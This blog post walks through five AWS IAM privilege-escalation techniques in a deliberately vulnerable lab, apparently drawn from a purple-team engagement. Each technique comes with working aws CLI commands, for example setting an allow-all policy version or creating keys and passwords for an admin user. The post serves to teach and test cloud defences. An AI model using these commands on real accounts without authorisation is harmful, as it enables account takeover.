---
title: Privilege Escalation in AWS - Part 01
author:
date: 2023-08-07 22:15:00 +0500
comments: true
categories: [Cloud-Security, AWS]
tags: [cloud security, aws] # TAG names should always be lowercase
pin: true
image:
  path: /assets/img/posts/aws-priv-esc-01/cover.png
  alt: Credits to @rez0 for this image
---

## Background
Recently I was in a purple team engagement where our goal was to measure the mean time-to-detection for different types of attacks in the AWS cloud environment. Starting from an assumed-breached scenario, the whole engagement was divided into different parts. This post is about different attacks that we performed along the way, specifically some attacks that could allow an adversary to escalate their privileges after the initial access.

To follow along with this post, the following are important bits to note:
- The lab used here can be found at [Bishopfox iam-vulnerable](https://github.com/BishopFox/iam-vulnerable). A huge shoutout to the people at [Bishopfox](https://bishopfox.com/) for sharing amazing tools, labs, and research in this area.
- This is an assumed-breached scenario where we, as an adversary, have initial access into the target's AWS environment and have Read-Only access (a typical pentest setting right?).

With all set, let's get into the fun part.

## IAM-CreateNewPolicyVersion
In AWS, the privileges of a resource (user, group, role, etc) are defined by the policies attached to them. There are certain policies that if assigned to a role or group, could lead to privilege escalation. The `IAM-CreateNewPolicyVersion` is one such policy. A resource with this policy is allowed to create a new version of an existing policy, and while doing so, they can change/add custom permissions that could lead to privilege escalation.

### Assumptions
- We have compromised a user who has read-only access in the target environment.
- This user can assume a role that has `IAM-CreateNewPolicyVersion` permission.

### Enumeration
Let's first enumerate what role we can assume and what policies are attached to them. The first thing we can do is to list the details of a specific role and verify if we can assume it:
```bash
aws iam get-role --role-name privesc1-CreateNewPolicyVersion-role
```
![](/assets/img/posts/aws-priv-esc-01/case-01-01-Get-Role.png)
_Output of `aws iam get-role --role-name privesc1-CreateNewPolicyVersion-role` command_

> - Remember that these commands are issued in the context of the compromised user who has read-only access.
> - Also, Please ignore the `date` and `tee` commands in the screenshot, these were just used for keeping track of when a command was executed :)

In the above image, our compromised user is listed under the `principal` property of `AssumedRolePolicyDocument` meaning that this user is allowed to assume the `privesc1-CreateNewPolicyVersion-role`.

Now let's check the permissions of this role i.e., what policies are attached to it.

```bash
# list policies attached to this role
aws iam list-attached-role-policies --role-name privesc1-CreateNewPolicyVersion-role

# list all policy versions of the specified policy
aws iam list-policy-versions --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc1-CreateNewPolicyVersion

# get the policy document of specified policy and version
aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc1-CreateNewPolicyVersion --version-id v1
```

![](/assets/img/posts/aws-priv-esc-01/case-01-02-Get-Policy-Document.png)
_Getting the policy document of attached policy_

Looking at the output of the last command in the above image, it can be seen that this policy grants the `CreateNewPolicyVersion` permissions for **All (*)** resources. Now we can abuse these permissions since this policy is attached to the `privesc1-CreateNewPolicyVersion-role` role, which we can assume.

### Privilege Escalation
We can quickly create a custom policy document that permits all AWS actions on all resources:

```json
{
   "Version": "2012-10-17",
   "Statement": [
       {
           "Sid": "AllowEverything",
           "Effect": "Allow",
           "Action": "*",
           "Resource": "*"
       }
    ]
 }
```

Now, after assuming the target role, which in this case was `privesc1-CreateNewPolicyVersion-role`, we can create a new version of the policy document applied to the role itself:

```bash
aws iam create-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc1-CreateNewPolicyVersion --policy-document file:///policies/admin-policy.json --set-as-default --profile privesc1
```
![](/assets/img/posts/aws-priv-esc-01/case-01-03-Create-New-Policy-Version.png)
_Created new policy version and set it as default_

> - Note the `--set-as-default` flag here. Using this flag, when a new version is created, it is also set as the default version. Otherwise, we will have to change the default version separately and for that, another permission, `iam:SetDefaultPolicyVersion`, is required (**in this case, it is not!**).

With this, `privesc1-CreateNewPolicyVersion-role` role (or any resource to which this policy is attached) should have full access in this AWS environment. Just for quick verification, we can get the policy document again for the same policy (but version 2 now):

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc1-CreateNewPolicyVersion --version-id v2
```
![](/assets/img/posts/aws-priv-esc-01/case-01-04-Get-New-Policy-Document.png)
_Getting policy document of version 2_


## IAM-CreateAccessKey
In AWS, the `Access Key` is made up of two parts, the `access key ID` and the `secret access key`. Access Keys are credentials for a user in AWS, using which they can access all the resources (based on the permissions defined by policies). As mentioned in [AWS Docs](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html), a user can have a maximum of two access keys.

The `IAM-CreateAccessKey` permissions allow a resource to create the access key for a user mentioned in the policy.

### Assumptions
- We have compromised a user who has read-only access in the target environment.
- This user can assume a role that has `IAM-CreateAccessKey` permission.

### Enumeration
Whelp, this part is nothing different than the above. The goal here is to enumerate roles in the target environment that we can assume and then get the policy document of the attached policies:

```bash
aws iam get-role --role-name privesc4-CreateAccessKey-role
```
![](/assets/img/posts/aws-priv-esc-01/case-04-01-Get-Role.png)


Our compromised user is listed under the `principal` property i.e., we can assume this role.

Further enumerating the policies, we find out that this role can create access keys for all users!

```bash
aws iam list-attached-role-policies --role-name privesc4-CreateAccessKey-role

aws iam list-policy-versions --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc4-CreateAccessKey

aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc4-CreateAccessKey --version-id v1
```

![](/assets/img/posts/aws-priv-esc-01/case-04-02-Get-Policy-Document.png)



### Privilege Escalation
The first step is to assume the role `privesc4-CreateAccessKey-role` so that we can create a new access key for the target user(s). Since the goal here is to escalate privileges, we will create an access key for a higher-privileged user:

```bash
aws iam create-access-key --user-name super-user --profile privesc4
```

Here we are assuming that the user `super-user` has full access to the target environment.

![](/assets/img/posts/aws-priv-esc-01/case-04-03-Create-Access-Key-for-Admin.png)
_Creating Access Key for a user with higher privileges_

Since we have the Access Key of an higher privileged user now, we can use it to get elevated privileges.

## IAM-CreateLoginProfile
In AWS, a user can log in to the AWS Management Console using their account-id, username, and password. For this to work, the user must have a password set allowing them to log in to console.

### Assumptions
- We have compromised a user who has read-only access in the target environment.
- This user can assume a role that has `IAM-CreateLoginProfile` permission on at least one user.
- The target user **must not** have console login configured already.

### Enumeration
Quickly checking the role if we can assume it, and then getting its policy document to check the permissions:

```bash
aws iam get-role --role-name privesc5-CreateLoginProfile-role
```

![](/assets/img/posts/aws-priv-esc-01/case-05-01-Get-Role.png)
_Get details of target role_


The property `principal` under the `AssumeRolePolicyDocument` has our user listed, meaning we can assume this role. Next, we will check the permissions by getting the policy document of the attached policy to this role:

```bash
aws iam list-attached-role-policies --role-name privesc5-CreateLoginProfile-role

aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc5-Creat eLoginProfile --version-id v1
```

![](/assets/img/posts/aws-priv-esc-01/case-05-02-Get-Policy-Document.png)
_Get Policy document_

Based on the output in the above image, we can confirm that this role has `IAM-CreateLoginProfile` permission over **ALL** resources.

### Privilege Escalation
To exploit this misconfigured policy, we can select a user having the following characteristics:
- This user has higher privileges than our current compromised user.
- This user does not have the console login configured already.


> The `get-login-profile` command can be used to verify that an IAM user has a password. The command returns a `NoSuchEntity` error if no password is defined for the user.

```bash
aws iam create-login-profile --user-name super-user --no-password-reset-required --password 'Passwordone2three!' --profile privesc5
```

> The option `--no-password-reset-required` means that when the user logins for the 1st time, they won't have to reset their password.

![](/assets/img/posts/aws-priv-esc-01/case-05-03-Create-Login-Profile.png)
_Creating console logon for a higher privileged user_

Now we have elevated privileges as we can access an higher privileged user.


## IAM-UpdateLoginProfile
This is quite easy to grasp if you understood the above technique. Once the console login is configured for a user, a user can update their password later on. To allow other users/roles to have this permission to update the password of another user in AWS, the permission `IAM-UpdateLoginProfile` is required.

### Assumptions
- We have compromised a user who has read-only access in the target environment.
- This user can assume a role that has `IAM-UpdateLoginProfile` permission on at least one user.

### Enumeration

```bash
aws iam get-role --role-name privesc6-UpdateLoginProfile-role
```
![](/assets/img/posts/aws-priv-esc-01/case-06-01-Get-Role.png)
_Get details of the specified role_

```bash
aws iam list-attached-role-policies --role-name privesc6-UpdateLoginProfile-role

aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc6-UpdateLoginProfile --version-id v1
```

![](/assets/img/posts/aws-priv-esc-01/case-06-02-Get-Policy-Document.png)
_Get policy Document_

Based on the above image, we are sure that this role can update the password of **All** resources (users).

### Privilege Escalation
To exploit this misconfiguration, we need to select a user who has higher privileges than our current user. Then we can update their password using the below command:

```bash
aws iam update-login-profile --user-name super-user --no-password-reset-required --password '<Passwordone2three!!>' --profile privesc6
```

![](/assets/img/posts/aws-priv-esc-01/case-06-03-Update-Login-Profile.png)
_Updating password of target user who has higher privileges_

With the updated password, we can access this user and get higher privileges.


## IAM-AddUserToGroup
From [AWS Docs](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_groups.html), An IAM user group is a collection of IAM users. User groups let you specify permissions for multiple users, which can make it easier to manage the permissions for those users. For example, you could have a user group called Admins and give that user group typical administrator permissions. Any user in that user group automatically has Admins group permissions.

The `IAM-AddUserToGroup` permission is required to allow a user/role to add other users (including the current user) to a specific group.

### Assumptions
- We have compromised a user who has read-only access in the target environment.
- This user can assume a role that has `IAM-AddUserToGroup` permission.

### Enumeration
We start by listing details of different roles from which the `privesc13-AddUserToGroup-role` role shows that our current user can assume it:

```bash
aws iam get-role --role-name privesc13-AddUserToGroup-role
```

![](/assets/img/posts/aws-priv-esc-01/case-13-01-Get-Role.png)
_Get details of the specified role_

Further, the policy document shows that this role has permission to add **Any** user to any group:

```bash
aws iam list-attached-role-policies --role-name privesc13-AddUserToGroup-role

aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/privesc13-AddUserToGroup --version-id v1
```

![](/assets/img/posts/aws-priv-esc-01/case-13-02-Get-Policy-Document.png)
_Get policy document of specified policy_

### Privilege Escalation
With the confirmation of what this role can do, the first step is to assume it. After that, we can add our compromised user to a higher privileged group. The `privesc-sre-group` is one such group that allows full access to this AWS environment:

```bash
aws iam add-user-to-group --group-name privesc-sre-group --user-name compromised-user-name --profile privesc13
```

![](/assets/img/posts/aws-priv-esc-01/case-13-03-Put-User-to-Group.png)
_Adding compromised user to higher privileged group_

Since our compromised user is now part of a group which has high privileges, this grants us higher privileges than we previously had.

## Wrapping Up
In this blog post, we covered very few misconfigurations in an AWS environment that could lead to escalated privileges. This was the first post in a series to come. I might not write about every technique, but will surely try to list down the major ones.

See you in the next post. Adios!

### References
This blog post could not have been possible without the amazing work of multiple peeps. Kudos to all the original researchers!
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://bishopfox.com/blog/privilege-escalation-in-aws](https://bishopfox.com/blog/privilege-escalation-in-aws)
- [https://github.com/BishopFox/iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)